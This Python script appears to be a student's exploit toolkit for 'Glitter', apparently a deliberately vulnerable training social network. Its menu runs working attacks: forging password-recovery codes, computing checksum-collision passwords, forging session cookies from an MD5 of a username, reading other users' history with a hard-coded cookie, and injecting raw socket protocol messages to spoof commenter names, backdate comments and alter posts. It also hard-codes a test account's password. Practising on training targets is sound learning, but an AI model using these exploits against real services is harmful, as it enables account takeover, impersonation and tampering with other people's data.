import socket
import requests
import hashlib
import datetime
import time

# Function to send and receive messages via socket
def send_message(sock, message):
    formatted_message = f"{message}##"
    sock.sendall(formatted_message.encode())
    print(f"Sent: {formatted_message.strip()}")
    response = sock.recv(4096).decode()
    print(f"Received: {response.strip()}")
    return response

# Function to perform password recovery
def password_recovery():
    username = input("Enter username: ")
    user_id = input("Enter user id: ")

    # Calculate the recovery code based on current date, time, and user ID
    current_date = datetime.datetime.now().strftime("%d%m")
    current_hour = (datetime.datetime.now() - datetime.timedelta(minutes=6)).strftime("%H%M")
    recovery_code = f"{current_date}{calculate_geometry_string(user_id)}{current_hour}"

    print(f"Recovery code: {recovery_code}")

    # URL and headers for password recovery code verification
    url = "http://cyber.glitter.org.il/password-recovery-code-verification/"
    headers = {
        "Host": "cyber.glitter.org.il",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "http://cyber.glitter.org.il",
        "Referer": "http://cyber.glitter.org.il/password-recovery",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    data = [username, recovery_code]

    # Send POST request with the recovery code
    response = requests.post(url, headers=headers, json=data)

    print(f"Response Status Code: {response.status_code}")
    print(f"Response Content: {response.text}")

# Function to calculate geometry string from user ID
def calculate_geometry_string(user_id):
    result = ""
    for digit in str(user_id):
        num = int(digit)
        letter = chr(num + 65)  # Convert digit to corresponding letter
        result += letter
    return result

# Function to view user history
def view_user_history(user_id):
    url = f'http://cyber.glitter.org.il/history/{user_id}'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Referer': 'http://cyber.glitter.org.il/home',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': 'sparkle=30062024.3572e573822f8e6df66ba0acf972b050.1635.30062024',
        'If-None-Match': 'W/"456-TGK5GAFa2AYuAfX50KpyHq+2nwY"'
    }

    # Send GET request to retrieve user history
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print("User History:")
        print(response.json())
    else:
        print(f"Failed to retrieve user history. Status code: {response.status_code}")

# Function for weak login attempt
def login_weak(username, checksum):
    name_sum = sum(ord(char) for char in username)
    password_sum = checksum - name_sum
    print("Create password with that sum of asci: ", password_sum)

# Function to generate a cookie based on username
def get_cookie(username):
    current_date = datetime.datetime.now().strftime("%d%m%Y")
    encoded_username = hashlib.md5(username.encode()).hexdigest()
    cookie = f"{current_date}.{encoded_username}.{datetime.datetime.now().strftime('%H%M')}.{current_date}"
    return cookie

# Function to publish a "glit" with a chosen font color
def publish_glit():
    chosen_font_color = input("Enter the font color you want to use (e.g., Red, Blue, Green): ")
    publisher_id = input("Enter your publisher ID: ")

    publish_message = f'550#{{gli&&er}}{{"feed_owner_id":42652,"publisher_id":{publisher_id},"publisher_screen_name":"Eren Yeagar","publisher_avatar":"im8","background_color":"White","date":"2024-06-23T16:02:01.514Z","content":"Your content here","font_color":"{chosen_font_color}","id":-1}}'
    print(f"Publishing message with font color: {chosen_font_color}")

    server_address = ('54.187.16.171', 1336)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect(server_address)
        print(f"Connected to server at {server_address}")

        login_message = '100#{gli&&er}{"user_name":"ErenYeagar","password":"Eren12345","enable_push_notifications":true}'
        login_response = send_message(sock, login_message)

        if '105#Login received' not in login_response:
            print("Login request failed.")
            return

        checksum_message = '110#{gli&&er}1644'
        checksum_response = send_message(sock, checksum_message)

        if '115#Authentication approved' not in checksum_response:
            print("Checksum request failed.")
            return

        publish_response = send_message(sock, publish_message)

        if '555#Glit publish approved' not in publish_response:
            print("Glit publish request failed.")
            return

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()
        print("Socket closed.")

# Function to perform weak search
def search_weak():
    server_address = ('54.187.16.171', 1336)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect(server_address)
        print(f"Connected to server at {server_address}")

        login_message = '100#{gli&&er}{"user_name":"ErenYeagar","password":"Eren12345","enable_push_notifications":true}'
        login_response = send_message(sock, login_message)

        if '105#Login received' not in login_response:
            print("Login request failed.")
            return

        checksum_message = '110#{gli&&er}1644'
        checksum_response = send_message(sock, checksum_message)

        if '115#Authentication approved' not in checksum_response:
            print("Checksum request failed.")
            return

        search_message = '300#{gli&&er}{"search_type":"SIMPLE","search_entry":"admin admin"}'
        search_response = send_message(sock, search_message)

        print("Last server response for 'admin admin':")
        print(search_response)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()
        print("Socket closed.")

# Function to send a comment with a fake name
def send_comment(user_screen_name):
    server_address = ('54.187.16.171', 1336)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect(server_address)
        print(f"Connected to server at {server_address}")

        # Sending login message
        login_message = '100#{gli&&er}{"user_name":"ErenYeagar","password":"Eren12345","enable_push_notifications":true}'
        login_response = send_message(sock, login_message)
        time.sleep(1)

        # Check if login was received successfully
        if '105#Login received' not in login_response:
            print("Login request failed.")
            return

        # The checksum message
        checksum_message = '110#{gli&&er}1644'
        checksum_response = send_message(sock, checksum_message)
        time.sleep(1)

        # Check if authentication was approved
        if '115#Authentication approved' not in checksum_response:
            print("Checksum request failed.")
            return

        # Step 1: Send entity request
        entity_request = '310#{gli&&er}42652'
        entity_response = send_message(sock, entity_request)
        time.sleep(1)

        # Check if entity request was successful
        if '315#Entity fetched succesfully' not in entity_response:
            print("Entity request failed.")
            return

        # Step 2: Send updates request
        updates_request = '440#{gli&&er}42652'
        updates_response = send_message(sock, updates_request)
        time.sleep(1)

        # Check if updates request was successful
        if '445#Updates load approved' not in updates_response:
            print("Updates request failed.")
            return

        # Step 3: Send feed request
        feed_request = '500#{gli&&er}{"feed_owner_id":42652,"end_date":"2024-06-23T11:17:54.666Z","glit_count":2}'
        feed_response = send_message(sock, feed_request)
        time.sleep(1)

        # Check if feed request was successful
        if '505#Feed loading approved' not in feed_response:
            print("Feed request failed.")
            return

        # Step 4: Send a comment with the user's screen name
        comment_message = f'650#{{gli&&er}}{{"glit_id":52544,"user_id":42652,"user_screen_name":"{user_screen_name}","id":-1,"content":"dror banks","date":"2024-06-23T11:17:58.446Z"}}'
        comment_response = send_message(sock, comment_message)
        time.sleep(1)

        # Check if comment request was successful
        if '655#Comment publish approved' not in comment_response:
            print("Comment request failed.")
            return

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the socket
        sock.close()
        print("Socket closed.")

# Function to send a comment with a fake date
def date_weak():
    user_screen_name = input("Enter the screen name to use for the comment: ")

    # Connect to the server
    server_address = ('54.187.16.171', 1336)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect(server_address)
        print(f"Connected to server at {server_address}")

        # Sending login message
        login_message = '100#{gli&&er}{"user_name":"ErenYeagar","password":"Eren12345","enable_push_notifications":true}'
        send_message(sock, login_message)

        # Give server time to process the message
        time.sleep(1)

        # The checksum message
        checksum_message = '110#{gli&&er}1644'
        send_message(sock, checksum_message)

        time.sleep(1)

        # Comment message with the user's chosen screen name
        comment_message = f'650#{{gli&&er}}{{"glit_id":49750,"user_id":42652,"user_screen_name":"{user_screen_name}","id":-1,"content":"dror is bank","date":"1900-01-01T00:00:00.000Z"}}'
        send_message(sock, comment_message)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the socket
        sock.close()
        print("Socket closed.")

# Main menu loop
if __name__ == "__main__":
    while True:
        print("\nMenu:")
        print("1. Password Recovery")
        print("2. Login Weak")
        print("3. View User History")
        print("4. Get Cookie")
        print("5. Publish Glit with color")
        print("6. Search weak")
        print("7. Send Comment with fake name")
        print("8. send comment with fake date")

        choice = input("Enter your choice: ")

        if choice == '1':
            password_recovery()
        elif choice == '2':
            username = input("Enter username: ")
            check_sum = int(input("Enter the checksum: "))
            login_weak(username, check_sum)
        elif choice == '3':
            user_id = int(input("Enter user id: "))
            view_user_history(user_id)
        elif choice == '4':
            user_name = input("Enter username: ")
            cookie = get_cookie(user_name)
            print(f"The cookie: {cookie}")
        elif choice == '5':
            publish_glit()
        elif choice == '6':
            search_weak()
        elif choice == '7':
            user_screen_name = input("Enter the screen name to use for the comment: ")
            send_comment(user_screen_name)
        elif choice == '8':
            date_weak()
        elif choice == '9':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please enter a valid option (1-8).")
